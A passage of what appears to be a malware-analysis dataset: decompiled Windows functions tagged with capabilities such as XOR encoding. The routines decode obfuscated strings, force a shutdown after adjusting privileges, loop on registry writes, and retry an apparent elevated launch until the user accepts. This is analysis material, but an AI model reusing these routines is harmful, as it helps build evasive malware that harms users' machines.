if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar10 = puVar7;\n            for (iVar9 = var_8h; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            if (stack0xffffffec != NULL) {\n                do {\n                    iVar9 = fcn.00402e2f();\n                    *(puVar7 + var_4h * 2) = *(iVar5 + (iVar9 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar3);\n            }\n            *(puVar7 + puVar3 * 2) = 0;\n        }\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return puVar7;\n}\n",
        "token_count": 1013
    },
    "004042e6": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004042e6(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    uint var_4h;\n    \n    var_34h = 0x2b323600;\n    var_30h = 0xe37274c;\n    var_2ch = 0x21035734;\n    var_28h = 0x3f503508;\n    var_24h = 0x39260636;\n    var_10h = 0x43615353;\n    var_ch._0_1_ = 0x39;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        var_4h = 5;\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % 5;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_10h + iVar6) ^ puVar1[&var_34h - iVar5];\n    } while (iVar7 < 0x14);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar4);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar5, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar3 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar7 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 == 0) {\n        (*pcVar3)(4, 0);\n    }\n    uVar4 = (*pcVar2)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 613
    },
    "0040509e": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040509e(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint *var_8ch;\n    uint *var_88h;\n    uint var_80h;\n    uint hObject;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t lpLibFileName;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    code *lpszLongPath;\n    \n    lpszLongPath = *0x41cad8;\n    var_4ch = 0x470d454e;\n    puVar9 = &lpDst;\n    for (iVar5 = 0x410; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x7a2b6b22;\n    var_44h = 0x45024b23;\n    puVar9 = &ARG_0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_40h = 0x6b6e4708;\n    var_3ch = 0x4b347a19;\n    puVar9 = &ARG_0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_38h = 0x47094512;\n    var_34h = 0x7a206b3f;\n    puVar9 = &lpszShortPath;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_30h = 0x45584b2a;\n    var_2ch = 0x6b174748;\n    var_28h = 0x4b2a7a26;\n    var_24h._0_1_ = 0xf;\n    var_24h._1_1_ = 0x45;\n    var_24h._2_2_ = 0x4754;\n    var_20h._0_2_ = 0x6b2e;\n    var_20h._2_2_ = 0x7a3d;\n    var_1ch = 0x456b4b22;\n    var_54h = 0x477a456b;\n    var_50h._0_1_ = 0x4b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    var_5ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_58h = 5;\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_5ch;\n        iVar6 = iVar5 % 5;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_54h + iVar6) ^ puVar1[&var_4ch - var_5ch];\n    } while (iVar5 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_5ch, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_38h = 0x5340436a;\n    var_34h = 0x436a4b56;\n    var_30h = 0x4b46534d;\n    var_2ch = 0x530e433e;\n    var_28h = 0x433e4b47;\n    var_24h._0_1_ = 0x4f;\n    var_24h._1_1_ = 0x53;\n    var_24h._2_2_ = 0x4b10;\n    var_20h._0_2_ = 0x4339;\n    var_20h._2_2_ = 0x534d;\n    var_1ch = CONCAT22(var_1ch._2_2_, 0x4b35);\n    var_ch = 0x536f434a;\n    var_8h = CONCAT22(var_8h._2_2_, 0x4b35);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    var_54h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    lpLibFileName = 6;\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_54h;\n        iVar6 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_ch + iVar6) ^ puVar1[&var_38h - var_54h];\n    } while (iVar5 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_54h, &lpszShortPath);\n    var_10h = 0x561e3530;\n    var_ch = 0x6b544217;\n    var_8h = 0x35427925;\n    lpLibFileName = 0x566b3542;\n    puVar9 = &var_9ch;\n    for (iVar5 = 0x3c; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_14h._0_1_ = 0x79;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_90h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_90h;\n        iVar6 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&lpLibFileName + iVar6) ^ puVar1[&var_10h - var_90h];\n    } while (iVar5 < 0xc);\n    var_8ch = &lpDst;\n    var_9ch = 0x3c;\n    var_88h = &ARG_0;\n    var_80h = 3;\n    var_98h = 0x40;\n    var_60h = var_90h;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_24h._0_1_ = 0x1e;\n    var_24h._1_1_ = 5;\n    var_24h._2_2_ = 0x2e7d;\n    var_20h._0_2_ = 0x7e03;\n    var_20h._2_2_ = 0x167f;\n    var_1ch = 0x4d212306;\n    var_ch = 0x62384d4d;\n    var_8h._0_1_ = 0x4f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + lpLibFileName;\n        iVar6 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_ch + iVar6) ^ puVar1[&var_24h - lpLibFileName];\n    } while (iVar5 < 0xc);\n    var_28h = 0x2933261e;\n    var_24h._0_1_ = 0x59;\n    var_24h._1_1_ = 8;\n    var_24h._2_2_ = 0x3336;\n    var_20h._0_2_ = 0x4026;\n    var_20h._2_2_ = 0x2b39;\n    var_1ch = 0x4d623d13;\n    var_ch = 0x45564e4d;\n    var_8h = CONCAT31(var_8h._1_3_, 0x35);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = lpLibFileName;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar6;\n        iVar7 = iVar8 % var_58h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_ch + iVar7) ^ puVar1[&var_28h - iVar6];\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    lpszLongPath = pcVar4;\n    var_94h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar8 = (*pcVar4)(&var_9ch);\n    pcVar4 = lpszLongPath;\n    while ((iVar8 == 0 && (iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar8 == 0x4c7))) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        var_94h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar8 = (*pcVar4)(&var_9ch);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    uVar3 = (*pcVar2)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_60h);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_54h);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_5ch);\n    (*pcVar4)(uVar3);\n    return 1;\n}\n",
        "token_count": 2733
    },
    "004062df": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __fastcall fcn.004062df(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *ARG_0;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_54h = 0x603e1f3f;\n    iVar5 = 8;\n    puVar8 = &var_2ch;\n    var_14h = param_2;\n    for (iVar4 = iVar5; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_50h = 0x2f191735;\n    var_4ch = 0x132c3443;\n    puVar8 = &var_44h;\n    for (iVar4 = iVar5; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_48h = 0x78345527;\n    var_1ch = 0x304a7a78;\n    puVar8 = &var_3ch;\n    for (iVar4 = iVar5; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_18h._0_1_ = 0x47;\n    puVar8 = &var_34h;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar4 = 0;\n    do {\n        puVar1 = iVar4 + var_8h;\n        iVar5 = iVar4 % 5;\n        iVar4 = iVar4 + 1;\n        *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_54h - var_8h];\n    } while (iVar4 < 0x10);\n    var_54h = 0xb452c32;\n    var_50h = 0x7b6a1413;\n    var_4ch = 0x141a0119;\n    var_48h._0_1_ = 0x59;\n    var_24h = 0x65374959;\n    var_20h._0_2_ = 0x7876;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar4 = var_8h;\n    iVar5 = 0;\n    do {\n        ARG_0 = 0x6;\n        puVar1 = iVar5 + var_1ch;\n        iVar6 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_54h - var_1ch];\n    } while (iVar5 < 0xd);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_1ch, var_8h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (pcVar3 != NULL) {\n        iVar5 = (*pcVar3)(var_10h, &var_2ch, &var_44h, &var_3ch, &var_34h);\n        if (iVar5 != 0) {\n            uVar2 = (*pcVar7)(8, 0x104);\n            pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            var_54h = 0x631a0d44;\n            var_50h = 0x1a11595e;\n            puVar9 = ARG_0;\n            for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_4ch = 0x11595e63;\n            var_48h._0_1_ = 0x37;\n            var_24h = 0x46376961;\n            var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x6e);\n            uVar2 = (*pcVar7)(8, 0xe);\n            iVar4 = (*pcVar3)(uVar2);\n            puVar9 = ARG_0;\n            iVar5 = 0;\n            do {\n                puVar1 = iVar5 + iVar4;\n                iVar6 = iVar5 % var_4h;\n                iVar5 = iVar5 + 1;\n                *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_54h - iVar4];\n            } while (iVar5 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, iVar4, var_14h, var_28h, var_2ch);\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar4 = var_8h;\n            goto code_r0x004064b8;\n        }\n    }\n    puVar9 = NULL;\ncode_r0x004064b8:\n    uVar2 = (*pcVar7)(0, var_1ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar7)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return puVar9;\n}\n",
        "token_count": 1605
    },
    "004064db": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004064db(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint var_170h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    ushort var_14h;\n    uchar var_12h;\n    uint var_11h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_68h = 0;\n    var_64h = 0x375e2c12;\n    var_60h = 0x5d31203b;\n    puVar7 = &var_170h;\n    for (iVar3 = 0x104; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_5ch = 0x2028011f;\n    var_58h = 0x2e3f2c4a;\n    var_54h = 0x1b1f4c25;\n    var_50h = 0x2c5c2d28;\n    var_4ch = 0x7b1f323b;\n    var_48h = 0x26333e36;\n    var_44h = 0x241a3756;\n    var_40h = 0x232a4b31;\n    var_3ch = 0x2d711f2f;\n    var_38h = 0x56312438;\n    var_34h = 0x10613826;\n    var_30h = 0x2838375d;\n    var_2ch = 0x10305f2d;\n    var_28h = 0x26562c1b;\n    var_24h = 0x5c661d3f;\n    var_20h._0_2_ = 0x4c1f;\n    var_ch = 0x43384341;\n    var_8h._0_1_ = 0x4c;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    var_6ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar3 = 0;\n    do {\n        puVar1 = iVar3 + var_6ch;\n        iVar4 = iVar3 % 5;\n        iVar3 = iVar3 + 1;\n        *puVar1 = *(&var_ch + iVar4) ^ puVar1[&var_64h - var_6ch];\n    } while (iVar3 < 0x46);\n    var_11h._0_1_ = 5;\n    var_14h = 0x467d;\n    var_12h = 0x60;\n    var_11h._1_1_ = 0x4d;\n    var_1ch = 0x3550734f;\n    var_18h._0_2_ = 0x714d;\n    var_ch = 6;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = var_6ch;\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + iVar4;\n        iVar5 = iVar6 % var_ch;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_14h - iVar4];\n    } while (iVar6 < 5);\n    do {\n        iVar6 = 0;\n        do {\n            var_4h = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_170h, iVar3, iVar6);\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_170h, &var_4h);\n            if (iVar5 == 0) {\n                var_68h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_4h, iVar4, 0, 4, &var_68h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1217
    },
    "00406d62": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406d62(uint param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = 0;\n    var_4h = 0;\n    var_ch = param_1;\n    if (*0x41cde8 == NULL) {\n        var_24h = 0xb452c32;\n        var_20h = 0x7b6a1413;\n        var_1ch = 0x141a0119;\n        var_18h._0_1_ = 0x59;\n        var_14h = 0x65374959;\n        var_10h._0_2_ = 0x7876;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        do {\n            var_8h = 6;\n            puVar1 = iVar5 + iVar3;\n            iVar4 = iVar5 % 6;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_14h + iVar4) ^ puVar1[&var_24h - iVar3];\n        } while (iVar5 < 0xd);\n        iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar3);\n        if (iVar5 != 0) {\n            *0x41cde8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, 0x4107b4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        if (*0x41cde8 == NULL) goto code_r0x00406e2d;\n    }\n    iVar3 = (**0x41cde8)(var_ch, &var_4h);\n    if (iVar3 == 0) {\n        var_4h = 0xffffffff;\n    }\ncode_r0x00406e2d:\n    if (iVar5 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n    }\n    return var_4h;\n}\n",
        "token_count": 592
    },
    "00408923": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00408923(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = 0x17321201;\n    var_28h = 0x317c5303;\n    var_24h = 0x171717;\n    var_20h._0_2_ = 0x123b;\n    var_20h._2_1_ = 0x65;\n    var_1ch = 0x78656148;\n    var_18h._0_2_ = 0x6574;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_8h = 6;\n    iVar8 = 0;\n    var_ch = &var_2ch - var_10h;\n    do {\n        puVar1 = iVar8 + var_10h;\n        iVar5 = iVar8 % 6;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_2ch - var_10h];\n    } while (iVar8 < 0xf);\n    var_2ch = 0xb452c32;\n    var_28h = 0x7b6a1413;\n    var_24h = 0x141a0119;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x59);\n    var_1ch = 0x65374959;\n    var_18h._0_2_ = 0x7876;\n    uVar4 = (*pcVar2)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = var_10h;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_8h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_2ch - iVar5];\n    } while (iVar7 < 0xd);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n    *0x41d1f0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    if (*0x41d1f0 != NULL) {\n        iVar7 = (**0x41d1f0)(var_14h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar3 = var_4h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar2)(uVar4);\n    return uVar3;\n}\n",
        "token_count": 891
    },
    "00409347": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409347(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.0040bc2b();\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41cb24, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41cad4);\n    var_28h = 0x47184b2e;\n    var_24h = 0x4b266e39;\n    var_20h = 0x6e354713;\n    var_1ch = 0x47454b20;\n    var_18h = 0x4b3b6e35;\n    var_14h = 0x6e50470e;\n    var_10h = 0x476b4b43;\n    var_ch._0_2_ = 0x6e50;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    do {\n        var_4h = 6;\n        puVar1 = iVar5 + var_8h;\n        iVar4 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_10h + iVar4) ^ puVar1[&var_28h - var_8h];\n    } while (iVar5 < 0x18);\n    uVar3 = fcn.00401c61(0);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(uVar3);\n    fcn.0040b368();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 519
    },
    "0040a5e9": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a5e9(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = 0x23133a38;\n    var_20h = 0x2e080a77;\n    var_1ch = 0x1d67220e;\n    var_18h = 0x291f3a1c;\n    var_14h = 0x230c1140;\n    var_10h._0_1_ = 0x7a;\n    var_ch = 0x477a4f6d;\n    var_8h._0_2_ = 0x7834;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        var_4h = 6;\n        puVar1 = iVar6 + iVar4;\n        iVar5 = iVar6 % 6;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_ch + iVar5) ^ puVar1[&var_24h - iVar4];\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    } while (iVar6 < 0x15);\n    while (iVar6 = (*pcVar2)(0, iVar4),  iVar6 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 484
    },
    "0040a692": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040a692(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_3ah;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uchar var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_64h = 0xf01faf00;\n    var_60h = 0x505600;\n    var_5ch = 0x8002700;\n    var_58h = 0xc2900;\n    var_54h = 0x56900;\n    var_50h = 0x3ff00;\n    var_4ch = 0x1c4200;\n    var_48h = 0x163e00;\n    var_14h = 0;\n    var_2ch = 0x30720a2b;\n    